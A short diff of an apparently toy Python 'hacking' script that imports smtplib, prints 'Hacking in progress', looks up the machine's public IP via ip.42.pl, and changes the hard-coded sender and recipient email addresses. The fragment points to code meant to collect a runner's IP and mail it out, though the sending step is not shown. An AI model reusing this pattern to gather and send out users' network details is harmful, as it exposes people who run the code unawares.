@@ -5,8 +5,8 @@ import smtplib
 
 print("Hacking in progress")
 
-sender = "xxleethaxorsxx@gmail.com"
-receivers = ["xxleethaxorsxx@gmail.com"]
+sender = "dschana6@gmail.com"
+receivers = ["dschana6@gmail.com"]
 
 my_ip = urlopen('http://ip.42.pl/raw').read()
 
